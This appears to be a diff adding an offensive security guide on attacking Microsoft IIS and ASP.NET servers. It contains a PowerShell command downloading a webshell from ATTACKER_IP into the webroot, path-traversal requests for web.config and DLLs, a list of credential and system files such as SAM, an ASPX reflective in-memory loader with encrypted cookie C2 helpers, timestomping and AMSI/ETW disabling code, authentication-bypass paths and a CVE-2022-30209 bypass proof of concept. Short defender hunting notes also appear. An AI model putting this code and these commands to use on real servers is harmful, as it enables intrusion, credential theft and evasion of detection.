@@ -1,0 +1,421 @@
+# IIS - Internet Information Services
+
+Test executable file extensions:
+
+- asp
+- aspx
+- config
+- php
+
+## Writable webroot → ASPX command shell
+
+If a low-privileged user/group has **write access to `C:\inetpub\wwwroot`**, you can drop an ASPX webshell and execute OS commands as the application pool identity (often holding **SeImpersonatePrivilege**).
+
+- Verify ACLs: `icacls C:\inetpub\wwwroot` or `cacls .` looking for `(F)` on your user/group.
+- Upload a command webshell (e.g., fuzzdb/tennc `cmd.aspx`) using PowerShell:
+
+```powershell
+iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx
+```
+
+- Request `/shell.aspx` and run commands; identity typically shows `iis apppool\defaultapppool`.
+- Combine with Potato-family LPE (e.g., GodPotato/SigmaPotato) when the AppPool token has SeImpersonatePrivilege to pivot to SYSTEM.
+
+## Internal IP Address disclosure
+
+On any IIS server where you get a 302 you can try stripping the Host header and using HTTP/1.0 and inside the response the Location header could point you to the internal IP address:
+
+```
+nc -v domain.com 80
+openssl s_client -connect domain.com:443
+```
+
+Response disclosing the internal IP:
+
+```
+GET / HTTP/1.0
+
+HTTP/1.1 302 Moved Temporarily
+Cache-Control: no-cache
+Pragma: no-cache
+Location: https://192.168.5.237/owa/
+Server: Microsoft-IIS/10.0
+X-FEServer: NHEXCHANGE2016
+```
+
+## Execute .config files
+
+You can upload .config files and use them to execute code. One way to do it is appending the code at the end of the file inside an HTML comment: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
+
+More information and techniques to exploit this vulnerability [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
+
+## IIS Discovery Bruteforce
+
+Download the list that I have created:
+
+{{#file}}
+iisfinal.txt
+{{#endfile}}
+
+It was created merging the contents of the following lists:
+
+[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
+[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
+[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
+[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
+[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
+[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)
+
+Use it without adding any extension, the files that need it have it already.
+
+## Path Traversal
+
+### Leaking source code
+
+Check the full writeup in: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)
+
+> [!TIP]
+> As summary, there are several web.config files inside the folders of the application with references to "**assemblyIdentity**" files and "**namespaces**". With this information it's possible to know **where are executables located** and download them.\
+> From the **downloaded Dlls** it's also possible to find **new namespaces** where you should try to access and get the web.config file in order to find new namespaces and assemblyIdentity.\
+> Also, the files **connectionstrings.config** and **global.asax** may contain interesting information.
+
+In **.Net MVC applications**, the **web.config** file plays a crucial role by specifying each binary file the application relies on through **"assemblyIdentity"** XML tags.
+
+### **Exploring Binary Files**
+
+An example of accessing the **web.config** file is shown below:
+
+```html
+GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
+Host: example-mvc-application.minded
+```
+
+This request reveals various settings and dependencies, such as:
+
+- **EntityFramework** version
+- **AppSettings** for webpages, client validation, and JavaScript
+- **System.web** configurations for authentication and runtime
+- **System.webServer** modules settings
+- **Runtime** assembly bindings for numerous libraries like **Microsoft.Owin**, **Newtonsoft.Json**, and **System.Web.Mvc**
+
+These settings indicate that certain files, such as **/bin/WebGrease.dll**, are located within the application's /bin folder.
+
+### **Root Directory Files**
+
+Files found in the root directory, like **/global.asax** and **/connectionstrings.config** (which contains sensitive passwords), are essential for the application's configuration and operation.
+
+### **Namespaces and Web.Config**
+
+MVC applications also define additional **web.config files** for specific namespaces to avoid repetitive declarations in each file, as demonstrated with a request to download another **web.config**:
+
+```html
+GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
+Host: example-mvc-application.minded
+```
+
+### **Downloading DLLs**
+
+The mention of a custom namespace hints at a DLL named "**WebApplication1**" present in the /bin directory. Following this, a request to download the **WebApplication1.dll** is shown:
+
+```html
+GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
+Host: example-mvc-application.minded
+```
+
+This suggests the presence of other essential DLLs, like **System.Web.Mvc.dll** and **System.Web.Optimization.dll**, in the /bin directory.
+
+In a scenario where a DLL imports a namespace called **WebApplication1.Areas.Minded**, an attacker might infer the existence of other web.config files in predictable paths, such as **/area-name/Views/**, containing specific configurations and references to other DLLs in the /bin folder. For example, a request to **/Minded/Views/web.config** can reveal configurations and namespaces that indicate the presence of another DLL, **WebApplication1.AdditionalFeatures.dll**.
+
+### Common files
+
+From [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+
+```
+C:\Apache\conf\httpd.conf
+C:\Apache\logs\access.log
+C:\Apache\logs\error.log
+C:\Apache2\conf\httpd.conf
+C:\Apache2\logs\access.log
+C:\Apache2\logs\error.log
+C:\Apache22\conf\httpd.conf
+C:\Apache22\logs\access.log
+C:\Apache22\logs\error.log
+C:\Apache24\conf\httpd.conf
+C:\Apache24\logs\access.log
+C:\Apache24\logs\error.log
+C:\Documents and Settings\Administrator\NTUser.dat
+C:\php\php.ini
+C:\php4\php.ini
+C:\php5\php.ini
+C:\php7\php.ini
+C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache\logs\error.log
+C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
+c:\Program Files (x86)\php\php.ini"
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\conf\logs\access.log
+C:\Program Files\Apache Group\Apache\conf\logs\error.log
+C:\Program Files\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files\Apache Group\Apache2\conf\logs\access.log
+C:\Program Files\Apache Group\Apache2\conf\logs\error.log
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+C:\Program Files\MySQL\my.cnf
+C:\Program Files\MySQL\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.1\my.ini
+C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.5\my.ini
+C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.6\my.ini
+C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.7\my.ini
+C:\Program Files\php\php.ini
+C:\Users\Administrator\NTUser.dat
+C:\Windows\debug\NetSetup.LOG
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\php.ini
+C:\Windows\repair\SAM
+C:\Windows\repair\system
+C:\Windows\System32\config\AppEvent.evt
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\system
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SecEvent.evt
+C:\Windows\System32\config\SysEvent.evt
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+C:\Windows\win.ini
+C:\xampp\apache\conf\extra\httpd-xampp.conf
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\xampp\FileZillaFTP\FileZilla Server.xml
+C:\xampp\MercuryMail\MERCURY.INI
+C:\xampp\mysql\bin\my.ini
+C:\xampp\php\php.ini
+C:\xampp\security\webdav.htpasswd
+C:\xampp\sendmail\sendmail.ini
+C:\xampp\tomcat\conf\server.xml
+```
+
+## HTTPAPI 2.0 404 Error
+
+If you see an error like the following one:
+
+![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)
+
+It means that the server **didn't receive the correct domain name** inside the Host header.\
+In order to access the web page you could take a look to the served **SSL Certificate** and maybe you can find the domain/subdomain name in there. If it isn't there you may need to **brute force VHosts** until you find the correct one.
+
+## Decrypt encrypted configuration and ASP.NET Core Data Protection key rings
+
+Two common patterns to protect secrets on IIS-hosted .NET apps are:
+- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) for web.config sections like <connectionStrings>.
+- ASP.NET Core Data Protection key ring (persisted locally) used to protect application secrets and cookies.
+
+If you have filesystem or interactive access on the web server, co-located keys often allow decryption.
+
+- ASP.NET (Full Framework) – decrypt protected config sections with aspnet_regiis:
+
+```cmd
+# Decrypt a section by app path (site configured in IIS)
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"
+
+# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
+%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
+```
+
+- ASP.NET Core – look for Data Protection key rings stored locally (XML/JSON files) under locations like:
+  - %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
+  - HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
+  - App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)
+
+With the key ring available, an operator running in the app’s identity can instantiate an IDataProtector with the same purposes and unprotect stored secrets. Misconfigurations that store the key ring with the app files make offline decryption trivial once the host is compromised.
+
+## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)
+
+The Phantom Taurus/NET-STAR toolkit shows a mature pattern for fileless IIS persistence and post‑exploitation entirely inside w3wp.exe. The core ideas are broadly reusable for custom tradecraft and for detection/hunting.
+
+Key building blocks
+- ASPX bootstrapper hosting an embedded payload: a single .aspx page (e.g., OutlookEN.aspx) carries a Base64‑encoded, optionally Gzip‑compressed .NET DLL. Upon a trigger request it decodes, decompresses and reflectively loads it into the current AppDomain and invokes the main entry point (e.g., ServerRun.Run()).
+- Cookie‑scoped, encrypted C2 with multi‑stage packing: tasks/results are wrapped with Gzip → AES‑ECB/PKCS7 → Base64 and moved via seemingly legitimate cookie‑heavy requests; operators used stable delimiters (e.g., "STAR") for chunking.
+- Reflective .NET execution: accept arbitrary managed assemblies as Base64, load via Assembly.Load(byte[]) and pass operator args for rapid module swaps without touching disk.
+- Operating in precompiled ASP.NET sites: add/manage auxiliary shells/backdoors even when the site is precompiled (e.g., dropper adds dynamic pages/handlers or leverages config handlers) – exposed by commands such as bypassPrecompiledApp, addshell, listshell, removeshell.
+- Timestomping/metadata forgery: expose a changeLastModified action and timestomp on deployment (including future compilation timestamps) to hinder DFIR.
+- Optional AMSI/ETW pre‑disable for loaders: a second‑stage loader can disable AMSI and ETW before calling Assembly.Load to reduce inspection of in‑memory payloads.
+
+Minimal ASPX loader pattern
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.IO.Compression" %>
+<%@ Import Namespace="System.Reflection" %>
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e){
+    // 1) Obtain payload bytes (hard‑coded blob or from request)
+    string b64 = /* hardcoded or Request["d"] */;
+    byte[] blob = Convert.FromBase64String(b64);
+    // optional: decrypt here if AES is used
+    using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
+        using(var ms = new MemoryStream()){
+            gz.CopyTo(ms);
+            var asm = Assembly.Load(ms.ToArray());
+            // 2) Invoke the managed entry point (e.g., ServerRun.Run)
+            var t = asm.GetType("ServerRun");
+            var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
+            object inst = m.IsStatic ? null : Activator.CreateInstance(t);
+            m.Invoke(inst, new object[]{ HttpContext.Current });
+        }
+    }
+}
+</script>
+```
+
+Packing/crypto helpers (Gzip + AES‑ECB + Base64)
+```csharp
+using System.Security.Cryptography;
+
+static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
+    using(var aes = Aes.Create()){
+        aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
+        ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
+        return t.TransformFinalBlock(data, 0, data.Length);
+    }
+}
+
+static string Pack(object obj, byte[] key){
+    // serialize → gzip → AES‑ECB → Base64
+    byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
+    using var ms = new MemoryStream();
+    using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
+    byte[] enc = AesEcb(ms.ToArray(), key, true);
+    return Convert.ToBase64String(enc);
+}
+
+static T Unpack<T>(string b64, byte[] key){
+    byte[] enc = Convert.FromBase64String(b64);
+    byte[] cmp = AesEcb(enc, key, false);
+    using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
+    using var outMs = new MemoryStream(); gz.CopyTo(outMs);
+    return Deserialize<T>(outMs.ToArray());
+}
+```
+
+Cookie/session flow and command surface
+- Session bootstrap and tasking are carried via cookies to blend with normal web activity.
+- Commands observed in the wild included: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; and dynamic execution primitives code_self, code_pid, run_code for in‑memory .NET execution.
+
+Timestomping utility
+```csharp
+File.SetCreationTime(path, ts); 
+File.SetLastWriteTime(path, ts);
+File.SetLastAccessTime(path, ts);
+```
+
+Inline AMSI/ETW disable before Assembly.Load (loader variant)
+```csharp
+// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
+// and ntdll!EtwEventWrite to a stub; then load operator assembly
+DisableAmsi();
+DisableEtw();
+Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
+```
+See AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md
+
+Hunting notes (defenders)
+- Single, odd ASPX page with very long Base64/Gzip blobs; cookie‑heavy posts.
+- Unbacked managed modules inside w3wp.exe; strings like Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
+- Repeated delimiters like "STAR" in traffic; mismatched or even future timestamps on ASPX/assemblies.
+
+## Telerik UI WebResource.axd unsafe reflection (CVE-2025-3600)
+
+Many ASP.NET apps embed Telerik UI for ASP.NET AJAX and expose the unauthenticated handler Telerik.Web.UI.WebResource.axd. When the Image Editor cache endpoint is reachable (type=iec), the parameters dkey=1 and prtype enable unsafe reflection that executes any public parameterless constructor pre‑auth. This yields a universal DoS primitive and can escalate to pre‑auth RCE on apps with insecure AppDomain.AssemblyResolve handlers.
+
+See detailed techniques and PoCs here:
+
+## Old IIS vulnerabilities worth looking for
+
+### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure
+
+You can try to **enumerate folders and files** inside every discovered folder (even if it's requiring Basic Authentication) using this **technique**.\
+The main limitation of this technique if the server is vulnerable is that **it can only find up to the first 6 letters of the name of each file/folder and the first 3 letters of the extension** of the files.
+
+You can use [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) to test for this vulnerability:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`
+
+![](<../../images/image (844).png>)
+
+Original research: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)
+
+You can also use **metasploit**: `use scanner/http/iis_shortname_scanner`
+
+A nice idea to **find the final name** of the discovered files is to **ask LLMs** for options like it's done in the script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)
+
+### Basic Authentication bypass
+
+**Bypass** a basic authentication (**IIS 7.5**) trying to access: `/admin:$i30:$INDEX_ALLOCATION/admin.php` or `/admin::$INDEX_ALLOCATION/admin.php`
+
+You can try to **mix** this **vulnerability** and the last one to find new **folders** and **bypass** the authentication.
+
+## ASP.NET Trace.AXD enabled debugging
+
+ASP.NET include a debugging mode and its file is called `trace.axd`.
+
+It keeps a very detailed log of all requests made to an application over a period of time.
+
+This information includes remote client IP's, session IDs, all request and response cookies, physical paths, source code information, and potentially even usernames and passwords.
+
+[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)
+
+![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)
+
+## ASPXAUTH Cookie
+
+ASPXAUTH uses the following info:
+
+- **`validationKey`** (string): hex-encoded key to use for signature validation.
+- **`decryptionMethod`** (string): (default “AES”).
+- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
+- **`decryptionKey`** (string): hex-encoded key to use for decryption.
+
+However, some people will use the **default values** of these parameters and will use as **cookie the email of the user**. Therefore, if you can find a web using the **same platform** that is using the ASPXAUTH cookie and you **create a user with the email of the user you want to impersonate** on the server under attack, you may be able to us**e the cookie from the second server in the first one** and impersonate the user.\
+This attacked worked in this [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).
+
+## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>
+
+[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): A bug in the code **didn't properly check for the password given by the user**, so an attacker whose **password hash hits a key** that is already in the **cache** will be able to login as that user .
+
+```python
+# script for sanity check
+> type test.py
+def HashString(password):
+    j = 0
+    for c in map(ord, password):
+        j = c + (101*j)&0xffffffff
+    return j
+
+assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')
+
+# before the successful login
+> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
+HTTP/1.1 401 Unauthorized
+
+# after the successful login
+> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
+HTTP/1.1 200 OK
+```
+
+## References
+
+- [0xdf – HTB Job (IIS write → ASPX shell → GodPotato)](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
+- [AMSI/ETW bypass background (HackTricks)](../../windows-hardening/av-bypass.md)
